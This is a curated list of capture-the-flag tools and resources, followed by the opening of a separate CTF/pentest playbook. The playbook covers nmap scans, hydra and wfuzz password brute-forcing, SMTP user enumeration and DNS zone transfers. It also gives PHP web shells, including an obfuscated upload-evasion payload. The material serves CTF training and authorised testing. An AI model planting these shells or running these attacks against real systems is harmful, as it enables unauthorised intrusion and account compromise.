# Awesome CTF [![Build Status](https://travis-ci.org/apsdehal/awesome-ctf.svg?branch=master)](https://travis-ci.org/apsdehal/awesome-ctf) [![Awesome](https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg)](https://github.com/sindresorhus/awesome)

A curated list of [Capture The Flag](https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security) (CTF) frameworks, libraries, resources, softwares and tutorials. This list aims to help starters as well as seasoned CTF players to find everything related to CTFs at one place.

### Contributing

Please take a quick look at the [contribution guidelines](https://github.com/apsdehal/ctf-tools/blob/master/CONTRIBUTING.md) first.

#### _If you know a tool that isn't present here, feel free to open a pull request._

### Why?

It takes time to build up collection of tools used in CTF and remember them all. This repo helps to keep all these scattered tools at one place.

### Contents

- [Awesome CTF](#awesome-ctf)
  - [Create](#create)
    - [Forensics](#forensics)
    - [Platforms](#platforms)
    - [Steganography](#steganography)
    - [Web](#web)
  - [Solve](#solve)
    - [Attacks](#attacks)
    - [Bruteforcers](#bruteforcers)
    - [Cryptography](#crypto)
    - [Exploits](#exploits)
    - [Forensics](#forensics-1)
    - [Networking](#networking)
    - [Reversing](#reversing)
    - [Services](#services)
    - [Steganography](#steganography-1)
    - [Web](#web-1)

- [Resources](#resources)
  - [Operating Systems](#operating-systems)
  - [Starter Packs](#starter-packs)
  - [Tutorials](#tutorials)
  - [Wargames](#wargames)
  - [Websites](#websites)
  - [Wikis](#wikis)
  - [Writeups Collections](#writeups-collections)


# Create

*Tools used for creating CTF challenges*

- [Kali Linux CTF Blueprints](https://www.packtpub.com/eu/networking-and-servers/kali-linux-ctf-blueprints) - Online book on building, testing, and customizing your own Capture the Flag challenges.


## Forensics

*Tools used for creating Forensics challenges*

- [Dnscat2](https://github.com/iagox86/dnscat2) - Hosts communication through DNS.
- [Kroll Artifact Parser and Extractor (KAPE)](https://learn.duffandphelps.com/kape) - Triage program.
- [Magnet AXIOM](https://www.magnetforensics.com/downloadaxiom) - Artifact-centric DFIR tool.
- [Registry Dumper](http://www.kahusecurity.com/posts/registry_dumper_find_and_dump_hidden_registry_keys.html) - Dump your registry.

## Platforms

*Projects that can be used to host a CTF*

- [CTFd](https://github.com/isislab/CTFd) - Platform to host jeopardy style CTFs from ISISLab, NYU Tandon.
- [echoCTF.RED](https://github.com/echoCTF/echoCTF.RED) - Develop, deploy and maintain your own CTF infrastructure.
- [FBCTF](https://github.com/facebook/fbctf) - Platform to host Capture the Flag competitions from Facebook.
- [Haaukins](https://github.com/aau-network-security/haaukins)- A Highly Accessible and Automated Virtualization Platform for Security Education.
- [HackTheArch](https://github.com/mcpa-stlouis/hack-the-arch) - CTF scoring platform.
- [Mellivora](https://github.com/Nakiami/mellivora) - A CTF engine written in PHP.
- [MotherFucking-CTF](https://github.com/andreafioraldi/motherfucking-ctf) - Badass lightweight plaform to host CTFs. No JS involved.
- [NightShade](https://github.com/UnrealAkama/NightShade) - A simple security CTF framework.
- [OpenCTF](https://github.com/easyctf/openctf) - CTF in a box. Minimal setup required.
- [PicoCTF](https://github.com/picoCTF/picoCTF) - The platform used to run picoCTF. A great framework to host any CTF.
- [PyChallFactory](https://github.com/pdautry/py_chall_factory) - Small framework to create/manage/package jeopardy CTF challenges.
- [RootTheBox](https://github.com/moloch--/RootTheBox) - A Game of Hackers (CTF Scoreboard & Game Manager).
- [Scorebot](https://github.com/legitbs/scorebot) - Platform for CTFs by Legitbs (Defcon).
- [SecGen](https://github.com/cliffe/SecGen) - Security Scenario Generator. Creates randomly vulnerable virtual machines.

## Steganography

*Tools used to create stego challenges*

Check solve section for steganography.

## Web

*Tools used for creating Web challenges*

*JavaScript Obfustcators*

- [Metasploit JavaScript Obfuscator](https://github.com/rapid7/metasploit-framework/wiki/How-to-obfuscate-JavaScript-in-Metasploit)
- [Uglify](https://github.com/mishoo/UglifyJS)


# Solve

*Tools used for solving CTF challenges*

## Attacks

*Tools used for performing various kinds of attacks*

- [Bettercap](https://github.com/bettercap/bettercap) - Framework to perform MITM (Man in the Middle) attacks.
- [Yersinia](https://github.com/tomac/yersinia) - Attack various protocols on layer 2.

## Crypto

*Tools used for solving Crypto challenges*

- [CyberChef](https://gchq.github.io/CyberChef) - Web app for analysing and decoding data.
- [FeatherDuster](https://github.com/nccgroup/featherduster) - An automated, modular cryptanalysis tool.
- [Hash Extender](https://github.com/iagox86/hash_extender) - A utility tool for performing hash length extension attacks.
- [padding-oracle-attacker](https://github.com/KishanBagaria/padding-oracle-attacker) - A CLI tool to execute padding oracle attacks.
- [PkCrack](https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html) - A tool for Breaking PkZip-encryption.
- [QuipQuip](https://quipqiup.com) - An online tool for breaking substitution ciphers or vigenere ciphers (without key).
- [RSACTFTool](https://github.com/Ganapati/RsaCtfTool) - A tool for recovering RSA private key with various attack.
- [RSATool](https://github.com/ius/rsatool) - Generate private key with knowledge of p and q.
- [XORTool](https://github.com/hellman/xortool) - A tool to analyze multi-byte xor cipher.

## Bruteforcers

*Tools used for various kind of bruteforcing (passwords etc.)*

- [Hashcat](https://hashcat.net/hashcat/) - Password Cracker
- [Hydra](https://tools.kali.org/password-attacks/hydra) - A parallelized login cracker which supports numerous protocols to attack
- [John The Jumbo](https://github.com/magnumripper/JohnTheRipper) - Community enhanced version of John the Ripper.
- [John The Ripper](http://www.openwall.com/john/) - Password Cracker.
- [Nozzlr](https://github.com/intrd/nozzlr) - Nozzlr is a bruteforce framework, trully modular and script-friendly.
- [Ophcrack](http://ophcrack.sourceforge.net/) - Windows password cracker based on rainbow tables.
- [Patator](https://github.com/lanjelot/patator) - Patator is a multi-purpose brute-forcer, with a modular design.
- [Turbo Intruder](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack) - Burp Suite extension for sending large numbers of HTTP requests 

## Exploits

*Tools used for solving Exploits challenges*

- [DLLInjector](https://github.com/OpenSecurityResearch/dllinjector) - Inject dlls in processes.
- [libformatstr](https://github.com/hellman/libformatstr) - Simplify format string exploitation.
- [Metasploit](http://www.metasploit.com/) - Penetration testing software.
  - [Cheatsheet](https://www.comparitech.com/net-admin/metasploit-cheat-sheet/)
- [one_gadget](https://github.com/david942j/one_gadget) -  A tool to find the one gadget `execve('/bin/sh', NULL, NULL)` call.
  - `gem install one_gadget`
- [Pwntools](https://github.com/Gallopsled/pwntools) - CTF Framework for writing exploits.
- [Qira](https://github.com/BinaryAnalysisPlatform/qira) - QEMU Interactive Runtime Analyser.
- [ROP Gadget](https://github.com/JonathanSalwan/ROPgadget) - Framework for ROP exploitation.
- [V0lt](https://github.com/P1kachu/v0lt) - Security CTF Toolkit.

## Forensics

*Tools used for solving Forensics challenges*

- [Aircrack-Ng](http://www.aircrack-ng.org/) - Crack 802.11 WEP and WPA-PSK keys.
  - `apt-get install aircrack-ng`
- [Audacity](http://sourceforge.net/projects/audacity/) - Analyze sound files (mp3, m4a, whatever).
  - `apt-get install audacity`
- [Bkhive and Samdump2](http://sourceforge.net/projects/ophcrack/files/samdump2/) - Dump SYSTEM and SAM files.
  - `apt-get install samdump2 bkhive`
- [CFF Explorer](http://www.ntcore.com/exsuite.php) - PE Editor.
- [Creddump](https://github.com/moyix/creddump) - Dump windows credentials.
- [DVCS Ripper](https://github.com/kost/dvcs-ripper) - Rips web accessible (distributed) version control systems.
- [Exif Tool](http://www.sno.phy.queensu.ca/~phil/exiftool/) - Read, write and edit file metadata.
- [Extundelete](http://extundelete.sourceforge.net/) - Used for recovering lost data from mountable images.
- [Fibratus](https://github.com/rabbitstack/fibratus) - Tool for exploration and tracing of the Windows kernel.
- [Foremost](http://foremost.sourceforge.net/) - Extract particular kind of files using headers.
  - `apt-get install foremost`
- [Fsck.ext4](http://linux.die.net/man/8/fsck.ext3) - Used to fix corrupt filesystems.
- [Malzilla](http://malzilla.sourceforge.net/) - Malware hunting tool.
- [NetworkMiner](http://www.netresec.com/?page=NetworkMiner) - Network Forensic Analysis Tool.
- [PDF Streams Inflater](http://malzilla.sourceforge.net/downloads.html) - Find and extract zlib files compressed in PDF files.
- [Pngcheck](http://www.libpng.org/pub/png/apps/pngcheck.html) - Verifies the integrity of PNG and dump all of the chunk-level information in human-readable form.
  - `apt-get install pngcheck`
- [ResourcesExtract](http://www.nirsoft.net/utils/resources_extract.html) - Extract various filetypes from exes.
- [Shellbags](https://github.com/williballenthin/shellbags) - Investigate NT\_USER.dat files.
- [Snow](https://sbmlabs.com/notes/snow_whitespace_steganography_tool) - A Whitespace Steganography Tool.
- [USBRip](https://github.com/snovvcrash/usbrip) - Simple CLI forensics tool for tracking USB device artifacts (history of USB events) on GNU/Linux.
- [Volatility](https://github.com/volatilityfoundation/volatility) - To investigate memory dumps.
- [Wireshark](https://www.wireshark.org) - Used to analyze pcap or pcapng files

*Registry Viewers*
- [OfflineRegistryView](https://www.nirsoft.net/utils/offline_registry_view.html) - Simple tool for Windows that allows you to read offline Registry files from external drive and view the desired Registry key in .reg file format.
- [Registry Viewer®](https://accessdata.com/product-download/registry-viewer-2-0-0) - Used to view Windows registries.

## Networking

*Tools used for solving Networking challenges*

- [Masscan](https://github.com/robertdavidgraham/masscan) - Mass IP port scanner, TCP port scanner.
- [Monit](https://linoxide.com/monitoring-2/monit-linux/) - A linux tool to check a host on the network (and other non-network activities).
- [Nipe](https://github.com/GouveaHeitor/nipe) - Nipe is a script to make Tor Network your default gateway.
- [Nmap](https://nmap.org/) - An open source utility for network discovery and security auditing.
- [Wireshark](https://www.wireshark.org/) - Analyze the network dumps.
  - `apt-get install wireshark`
- [Zeek](https://www.zeek.org) - An open-source network security monitor.
- [Zmap](https://zmap.io/) - An open-source network scanner.

## Reversing

*Tools used for solving Reversing challenges*

- [Androguard](https://github.com/androguard/androguard) - Reverse engineer Android applications.
- [Angr](https://github.com/angr/angr) - platform-agnostic binary analysis framework.
- [Apk2Gold](https://github.com/lxdvs/apk2gold) - Yet another Android decompiler.
- [ApkTool](http://ibotpeaches.github.io/Apktool/) - Android Decompiler.
- [Barf](https://github.com/programa-stic/barf-project) - Binary Analysis and Reverse engineering Framework.
- [Binary Ninja](https://binary.ninja/) - Binary analysis framework.
- [BinUtils](http://www.gnu.org/software/binutils/binutils.html) - Collection of binary tools.
- [BinWalk](https://github.com/devttys0/binwalk) - Analyze, reverse engineer, and extract firmware images.
- [Boomerang](https://github.com/BoomerangDecompiler/boomerang) - Decompile x86/SPARC/PowerPC/ST-20 binaries to C.
- [ctf_import](https://github.com/docileninja/ctf_import) – run basic functions from stripped binaries cross platform.
- [cwe_checker](https://github.com/fkie-cad/cwe_checker) - cwe_checker finds vulnerable patterns in binary executables.
- [demovfuscator](https://github.com/kirschju/demovfuscator) - A work-in-progress deobfuscator for movfuscated binaries.
- [Frida](https://github.com/frida/) - Dynamic Code Injection.
- [GDB](https://www.gnu.org/software/gdb/) - The GNU project debugger.
- [GEF](https://github.com/hugsy/gef) - GDB plugin.
- [Ghidra](https://ghidra-sre.org/) - Open Source suite of reverse engineering tools.  Similar to IDA Pro.
- [Hopper](http://www.hopperapp.com/) - Reverse engineering tool (disassembler) for OSX and Linux.
- [IDA Pro](https://www.hex-rays.com/products/ida/) - Most used Reversing software.
- [Jadx](https://github.com/skylot/jadx) - Decompile Android files.
- [Java Decompilers](http://www.javadecompilers.com) - An online decompiler for Java and Android APKs.
- [Krakatau](https://github.com/Storyyeller/Krakatau) - Java decompiler and disassembler.
- [Objection](https://github.com/sensepost/objection) - Runtime Mobile Exploration.
- [PEDA](https://github.com/longld/peda) - GDB plugin (only python2.7).
- [Pin](https://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool) - A dynamic binary instrumentaion tool by Intel.
- [PINCE](https://github.com/korcankaraokcu/PINCE) - GDB front-end/reverse engineering tool, focused on game-hacking and automation.
- [PinCTF](https://github.com/ChrisTheCoolHut/PinCTF) - A tool which uses intel pin for Side Channel Analysis.
- [Plasma](https://github.com/joelpx/plasma) - An interactive disassembler for x86/ARM/MIPS which can generate indented pseudo-code with colored syntax.
- [Pwndbg](https://github.com/pwndbg/pwndbg) - A GDB plugin that provides a suite of utilities to hack around GDB easily.
- [radare2](https://github.com/radare/radare2) - A portable reversing framework.
- [Triton](https://github.com/JonathanSalwan/Triton/) - Dynamic Binary Analysis (DBA) framework.
- [Uncompyle](https://github.com/gstarnberger/uncompyle) - Decompile Python 2.7 binaries (.pyc).
- [WinDbg](http://www.windbg.org/) - Windows debugger distributed by Microsoft.
- [Xocopy](http://reverse.lostrealm.com/tools/xocopy.html) - Program that can copy executables with execute, but no read permission.
- [Z3](https://github.com/Z3Prover/z3) - A theorem prover from Microsoft Research.

*JavaScript Deobfuscators*

- [Detox](http://relentless-coding.org/projects/jsdetox/install) - A Javascript malware analysis tool.
- [Revelo](http://www.kahusecurity.com/posts/revelo_javascript_deobfuscator.html) - Analyze obfuscated Javascript code.

*SWF Analyzers*
- [RABCDAsm](https://github.com/CyberShadow/RABCDAsm) - Collection of utilities including an ActionScript 3 assembler/disassembler.
- [Swftools](http://www.swftools.org/) - Collection of utilities to work with SWF files.
- [Xxxswf](https://bitbucket.org/Alexander_Hanel/xxxswf) -  A Python script for analyzing Flash files.

## Services

*Various kind of useful services available around the internet*

- [CSWSH](http://cow.cat/cswsh.html) - Cross-Site WebSocket Hijacking Tester.
- [Request Bin](https://requestbin.com/) - Lets you inspect http requests to a particular url.

## Steganography

*Tools used for solving Steganography challenges*

- [AperiSolve](https://aperisolve.fr/) - Aperi'Solve is a platform which performs layer analysis on image (open-source).
- [Convert](http://www.imagemagick.org/script/convert.php) - Convert images b/w formats and apply filters.
- [Exif](http://manpages.ubuntu.com/manpages/trusty/man1/exif.1.html) - Shows EXIF information in JPEG files.
- [Exiftool](https://linux.die.net/man/1/exiftool) - Read and write meta information in files.
- [Exiv2](http://www.exiv2.org/manpage.html) - Image metadata manipulation tool.
- [Image Steganography](https://sourceforge.net/projects/image-steg/) - Embeds text and files in images with optional encryption. Easy-to-use UI.
- [Image Steganography Online](https://incoherency.co.uk/image-steganography) - This is a client-side Javascript tool to steganographically hide images inside the lower "bits" of other images
- [ImageMagick](http://www.imagemagick.org/script/index.php) - Tool for manipulating images.
- [Outguess](https://www.freebsd.org/cgi/man.cgi?query=outguess+&apropos=0&sektion=0&manpath=FreeBSD+Ports+5.1-RELEASE&format=html) - Universal steganographic tool.
- [Pngtools](https://packages.debian.org/sid/pngtools) - For various analysis related to PNGs.
  - `apt-get install pngtools`
- [SmartDeblur](https://github.com/Y-Vladimir/SmartDeblur) - Used to deblur and fix defocused images.
- [Steganabara](https://www.openhub.net/p/steganabara) -  Tool for stegano analysis written in Java.
- [SteganographyOnline](https://stylesuxx.github.io/steganography/) - Online steganography encoder and decoder.
- [Stegbreak](https://linux.die.net/man/1/stegbreak) - Launches brute-force dictionary attacks on JPG image.
- [StegCracker](https://github.com/Paradoxis/StegCracker) - Steganography brute-force utility to uncover hidden data inside files.
- [stegextract](https://github.com/evyatarmeged/stegextract) - Detect hidden files and text in images.
- [Steghide](http://steghide.sourceforge.net/) - Hide data in various kind of images.
- [StegOnline](https://georgeom.net/StegOnline/upload) - Conduct a wide range of image steganography operations, such as concealing/revealing files hidden within bits (open-source).
- [Stegsolve](http://www.caesum.com/handbook/Stegsolve.jar) - Apply various steganography techniques to images.
- [Zsteg](https://github.com/zed-0xff/zsteg/) - PNG/BMP analysis.

## Web

*Tools used for solving Web challenges*

- [BurpSuite](https://portswigger.net/burp) - A graphical tool to testing website security.
- [Commix](https://github.com/commixproject/commix) - Automated All-in-One OS Command Injection and Exploitation Tool.
- [Hackbar](https://addons.mozilla.org/en-US/firefox/addon/hackbartool/) - Firefox addon for easy web exploitation.
- [OWASP ZAP](https://www.owasp.org/index.php/Projects/OWASP_Zed_Attack_Proxy_Project) - Intercepting proxy to replay, debug, and fuzz HTTP requests and responses
- [Postman](https://chrome.google.com/webstore/detail/postman/fhbjgbiflinjbdggehcddcbncdddomop?hl=en) - Add on for chrome for debugging network requests.
- [Raccoon](https://github.com/evyatarmeged/Raccoon) - A high performance offensive security tool for reconnaissance and vulnerability scanning.
- [SQLMap](https://github.com/sqlmapproject/sqlmap) - Automatic SQL injection and database takeover tool.
  ```pip install sqlmap```
- [W3af](https://github.com/andresriancho/w3af) -  Web Application Attack and Audit Framework.
- [XSSer](http://xsser.sourceforge.net/) - Automated XSS testor.


# Resources

*Where to discover about CTF*

## Operating Systems

*Penetration testing and security lab Operating Systems*

- [Android Tamer](https://androidtamer.com/) - Based on Debian.
- [BackBox](https://backbox.org/) - Based on Ubuntu.
- [BlackArch Linux](https://blackarch.org/) - Based on Arch Linux.
- [Fedora Security Lab](https://labs.fedoraproject.org/security/) - Based on Fedora.
- [Kali Linux](https://www.kali.org/) - Based on Debian.
- [Parrot Security OS](https://www.parrotsec.org/) - Based on Debian.
- [Pentoo](http://www.pentoo.ch/) - Based on Gentoo.
- [URIX OS](http://urix.us/) - Based on openSUSE.
- [Wifislax](http://www.wifislax.com/) - Based on Slackware.

*Malware analysts and reverse-engineering*

- [Flare VM](https://github.com/fireeye/flare-vm/) - Based on Windows.
- [REMnux](https://remnux.org/) - Based on Debian.

## Starter Packs

*Collections of installer scripts, useful tools*

- [CTF Tools](https://github.com/zardus/ctf-tools) - Collection of setup scripts to install various security research tools.
- [LazyKali](https://github.com/jlevitsk/lazykali) - A 2016 refresh of LazyKali which simplifies install of tools and configuration.

## Tutorials

*Tutorials to learn how to play CTFs*

- [CTF Field Guide](https://trailofbits.github.io/ctf/) - Field Guide by Trails of Bits.
- [CTF Resources](http://ctfs.github.io/resources/) -  Start Guide maintained by community.
- [How to Get Started in CTF](https://www.endgame.com/blog/how-get-started-ctf) - Short guideline for CTF beginners by Endgame
- [Intro. to CTF Course](https://www.hoppersroppers.org/courseCTF.html) - A free course that teaches beginners the basics of forensics, crypto, and web-ex.
- [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA) - Video tutorials and walkthroughs of popular CTF platforms.
- [LiveOverFlow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w) - Video tutorials on Exploitation.
- [MIPT CTF](https://github.com/xairy/mipt-ctf) - A small course for beginners in CTFs (in Russian).


## Wargames

*Always online CTFs*

- [Backdoor](https://backdoor.sdslabs.co/) - Security Platform by SDSLabs.
- [Crackmes](https://crackmes.one/) - Reverse Engineering Challenges.
- [CryptoHack](https://cryptohack.org/) - Fun cryptography challenges.
- [echoCTF.RED](https://echoctf.red/) - Online CTF with a variety of targets to attack.
- [Exploit Exercises](https://exploit-exercises.lains.space/) - Variety of VMs to learn variety of computer security issues.
- [Exploit.Education](http://exploit.education) - Variety of VMs to learn variety of computer security issues.
- [Gracker](https://github.com/Samuirai/gracker) - Binary challenges having a slow learning curve, and write-ups for each level.
- [Hack The Box](https://www.hackthebox.eu) - Weekly CTFs for all types of security enthusiasts.
- [Hack This Site](https://www.hackthissite.org/) - Training ground for hackers.
- [Hacker101](https://www.hacker101.com/) - CTF from HackerOne
- [Hacking-Lab](https://hacking-lab.com/) - Ethical hacking, computer network and security challenge platform.
- [Hone Your Ninja Skills](https://honeyourskills.ninja/) - Web challenges starting from basic ones.
- [IO](http://io.netgarage.org/) - Wargame for binary challenges.
- [Microcorruption](https://microcorruption.com) - Embedded security CTF.
- [Over The Wire](http://overthewire.org/wargames/) - Wargame maintained by OvertheWire Community.
- [PentesterLab](https://pentesterlab.com/) - Variety of VM and online challenges (paid).
- [PicoCTF](https://2019game.picoctf.com) - All year round ctf game. Questions from the yearly picoCTF competition.
- [PWN Challenge](http://pwn.eonew.cn/) - Binary Exploitation Wargame.
- [Pwnable.kr](http://pwnable.kr/) - Pwn Game.
- [Pwnable.tw](https://pwnable.tw/) - Binary wargame.
- [Pwnable.xyz](https://pwnable.xyz/) - Binary Exploitation Wargame.
- [Reversin.kr](http://reversing.kr/) - Reversing challenge.
- [Ringzer0Team](https://ringzer0team.com/) - Ringzer0 Team Online CTF.
- [Root-Me](https://www.root-me.org/) - Hacking and Information Security learning platform.
- [ROP Wargames](https://github.com/xelenonz/game) - ROP Wargames.
- [SANS HHC](https://holidayhackchallenge.com/past-challenges/) - Challenges with a holiday theme
  released annually and maintained by SANS.
- [SmashTheStack](http://smashthestack.org/) - A variety of wargames maintained by the SmashTheStack Community.
- [Viblo CTF](https://ctf.viblo.asia) - Various amazing CTF challenges, in many different categories. Has both Practice mode and Contest mode.
- [VulnHub](https://www.vulnhub.com/) - VM-based for practical in digital security, computer application & network administration.
- [W3Challs](https://w3challs.com) - A penetration testing training platform, which offers various computer challenges, in various categories.
- [WebHacking](http://webhacking.kr) - Hacking challenges for web.


*Self-hosted CTFs*
- [Damn Vulnerable Web Application](http://www.dvwa.co.uk/) - PHP/MySQL web application that is damn vulnerable.
- [Juice Shop CTF](https://github.com/bkimminich/juice-shop-ctf) - Scripts and tools for hosting a CTF on [OWASP Juice Shop](https://www.owasp.org/index.php/OWASP_Juice_Shop_Project) easily.

## Websites

*Various general websites about and on CTF*

- [Awesome CTF Cheatsheet](https://github.com/uppusaikiran/awesome-ctf-cheatsheet#awesome-ctf-cheatsheet-) - CTF Cheatsheet.
- [CTF Time](https://ctftime.org/) - General information on CTF occurring around the worlds.
- [Reddit Security CTF](http://www.reddit.com/r/securityctf) - Reddit CTF category.

## Wikis

*Various Wikis available for learning about CTFs*

- [Bamboofox](https://bamboofox.github.io/) - Chinese resources to learn CTF.
- [bi0s Wiki](https://teambi0s.gitlab.io/bi0s-wiki/) - Wiki from team bi0s.
- [CTF Cheatsheet](https://uppusaikiran.github.io/hacking/Capture-the-Flag-CheatSheet/) - CTF tips and tricks.
- [ISIS Lab](https://github.com/isislab/Project-Ideas/wiki) - CTF Wiki by Isis lab.
- [OpenToAll](https://github.com/OpenToAllCTF/Tips) - CTF tips by OTA CTF team members.

## Writeups Collections

*Collections of CTF write-ups*

- [0e85dc6eaf](https://github.com/0e85dc6eaf/CTF-Writeups) - Write-ups for CTF challenges by 0e85dc6eaf
- [Captf](http://captf.com/) - Dumped CTF challenges and materials by psifertex.
- [CTF write-ups (community)](https://github.com/ctfs/) - CTF challenges + write-ups archive maintained by the community.
- [CTFTime Scrapper](https://github.com/abdilahrf/CTFWriteupScrapper) - Scraps all writeup from CTF Time and organize which to read first.
- [HackThisSite](https://github.com/HackThisSite/CTF-Writeups) - CTF write-ups repo maintained by HackThisSite team.
- [Mzfr](https://github.com/mzfr/ctf-writeups/) - CTF competition write-ups by mzfr
- [pwntools writeups](https://github.com/Gallopsled/pwntools-write-ups) - A collection of CTF write-ups all using pwntools.
- [SababaSec](https://github.com/SababaSec/ctf-writeups) - A collection of CTF write-ups by the SababaSec team
- [Shell Storm](http://shell-storm.org/repo/CTF/) - CTF challenge archive maintained by Jonathan Salwan.
- [Smoke Leet Everyday](https://github.com/smokeleeteveryday/CTF_WRITEUPS) - CTF write-ups repo maintained by SmokeLeetEveryday team.

### LICENSE

CC0 :)

---

---
title: Yet Another CTF Playbook
subtitle: Version 3
author:
    - evilcel3ri
date: June 2020 onwards
titlepage: true
titlepage-color: 3b9cff
urlcolor: #ee3e37
titlepage-rule-color: 370000
titlepage-text-color: 000000
table-of-contents: true
toc-depth: 4
number-sections: true
toc-title: "Table of Contents"
---

# Reconnaissance

## OSINT

### Find accounts online

* Sherlock: [https://github.com/sherlock-project/sherlock](https://github.com/sherlock-project/sherlock)
* TheHarvester: [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)
* WhatsMyName: [https://github.com/WebBreacher/WhatsMyName](https://github.com/WebBreacher/WhatsMyName)

### Crawl publicly available databases

* Dehashed: [https://dehashed.com/](https://dehashed.com/)
* Scylla: [https://scylla.sh/api](https://scylla.sh/api)

### Reverse look images

* [Online exiftool](http://exif.regex.info/exif.cgi)
* Yandex, Google Images, Bing Images, Tiny Eye


## Nmap

Quickstart:

```sh
nmap -sC -sV --top-ports 20 <IP> -o <FILE>
nmap -sC -sV --open --reason <IP> -o <FILE>
```

Full ports scan:

```sh
nmap -sV -sC -p- -O --open <IP> -o <FILE>
```

Ping sweep:

```sh
nmap -sn -PE <IP or Range>
```

UDP scan:

```sh
nmap -sU <IP or Range>
```

Scan for open ports, determine open services:

```sh
nmap --open -sV <IP or Range>
```

Scan and run default scripts:

```sh
nmap -sC <IP or Range>
```

Run a specific script:

```sh
# location on Kali: /usr/share/nmap/scripts/
nmap --script <SCRIPT_NAME> <IP>
```

Skip ping:

```sh
nmap -Pn <IP>
```

Output result to file:

```sh
nmap <IP> -o <FILE> # text file
nmap <IP> -oG <FiLE> # greppable file
nmap <IP> -oN <FILE> # nmap file
nmap <IP> -oA <FILE> # all formats
```


## Powershell

```powershell
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("<IP>", $_)) "Port
$_ is open!"} 2>$null
```

Basic Powershell commands:

| bash  | powershell             | options |
|-------|------------------------|---------|
| `cd`  | `Set-Location`         |         |
| `ls`  | `Get-ChildItem`        | `-Path`, `-File/Directory`, `-Filter`, `-Recurse`, `-Hidden`, `-ErrorAction SilentlyContinue` |
| `wc`  | `Measure-Object -word` |         |
| `cat` | `Get-Content`          | `-Path` |


Get the size of a file: `Measure-Object`

Find a string in a file/directory:

`Select-String -Path /path/ -Pattern '*.pdf'`

Never forget: `Get-Help COMMAND`


### Analysing results

#### Port 21 open

* connect with `ftp IP`
* check for `anonymous:anonymous` login
* check the ftp version and nmap has a couple of quick-win scripts:

```sh
nmap --script ftp-anon <IP>
nmap --script ftp-vsftpd-backdoor <IP>
nmap --script ftp-vuln-cve2010-4221 <IP>
```

#### Port 22 open

* possible default credentials, try a small `hydra` bruteforce:
```sh
hydra -L users.txt -P pass.txt IP ssh
```
Other wordlists to try out: `/usr/share/wordlists/wfuzz/others/common_pass.txt`

Think about creating a wordlist from the target website for example.

* **Post-exploitation**:

* possible writable `~/.ssh/authorized_keys`.
* weak crypto: [https://github.com/Ganapati/RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)
* predictable key: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

[Go to Post-Exploitation](#post-exploitation)

#### Port 25 open

You may be able to enumerate usernames through SMTP.

```sh
nc <IP> 25
[...]
VRFY root
252 2.0.0 root
VRFY idontexist
550 5.1.1 <idontexist>: Recipient address rejected: User unknown in local recipient table
```

Or the lazy way, use `smtp-user-enum`:

```sh
smtp-user-enum -M VRFY -u root -t <IP>
```

#### Port 53 open

* add the IP and a domain name to your `/etc/hosts` files
* try a zone transfer:

```sh
host -l <DOMAIN> <IP>
dig axfr @SRHOST <DOMAIN>
dnsrecon -d <DOMAIN>
```

* enumerate subdomains:

```sh
amass enum --passive -d <DOMAIN>
sublist3r -d <DOMAIN> -t 3 -e bing
```

#### Port 80 open

* Web-service running, use `dirb`, `nikto` or `gobuster` to get the most information as possible.

*Examples*:

* `dirb http://IP -r`
* `gobuster dir -w DICT -t 30 -x php,txt,js,html,css` You can use `-f` to try folders instead of files
* if you plan to bruteforce, try generate wordlist with `CeWL`
* if it's a Wordpress instance look into `wpscan`
* sometimes an open FTP is also a feature from a running IIS instance which comes with a CalDav instance. Try it out with `davtest` and exploit with `cadaver`
* `dirsearch big.txt -e sh,txt,htm,php,cgi,html,pl,bak,old`

Better crawl:
```
gobuster dir -w 'DICT' -x php -b 400,401,402,403,404,412,500,501,502,503 -s 200,301 --random-agent -r -u $1
```

##### WFUZZ

```sh
# POST
wfuzz --hc 404 -c -z list,admin -z file,/SecLists/Passwords/korelogic-password.txt -d "user=FUZZ&password=FUZ2Z" http://192.168.30.161/admin/index.php

# NTLM
wfuzz -c --ntlm "admin:FUZZ" -z file,/SecLists/Passwords/darkc0de.txt --hc 401 https://<ip>/api

# Basic Auth through Proxy
wfuzz -c --hc 404,400,401 -z file,/Audits/Activos/names.txt -z file,/Audits/Activos/names.txt --basic "FUZZ:FUZ2Z" -p 127.0.0.1:8080 https://<ip>/api/v1/
```

##### PHP RCE

test:

```
<?php phpinfo(); ?>
```

simple shell:
```
<?php system($_GET["c"]); ?>

<?php `$_GET["c"]`; ?>
```
file upload:
```
<?php file_put_contents('/var/www/html/uploads/test.php', '<?php system($_GET["c"]);?>'); ?>
```
file upload evasion: rot13 + urlencode
```
<?php $payload="%3C%3Fcuc%20flfgrz%28%24_TRG%5Bp%5D%29%3B%3F%3E"; file_put_contents('/var/www/html/uploads/test8.php', str_rot13(urldecode($payload))); ?>
```
**Reverse proxy misconfiguration**:

* Sometimes, servers have a misconfiured reverse proxy. Thus, you
need to add the hostnames that resolve to your target IP to your `/etc/hosts`
file:
```sh
<IP> <HOSTNAME>
```

**Common exploits**:

* XSS
* SQLi (l'`UNION` fait la force!)
* Directory Traversal ([Path traversal list windows](https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/) and [path traversal list linux](https://gracefulsecurity.com/path-traversal-cheat-sheet-linux/))
* Default credentials (admin:admin, root:root... Check also the name of the service or the default password for the running application.)
* if CGI-bin, check for Shellshock (TODO)
* If GraphQL, this query describes the whole schema:

```graphql
"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"
```

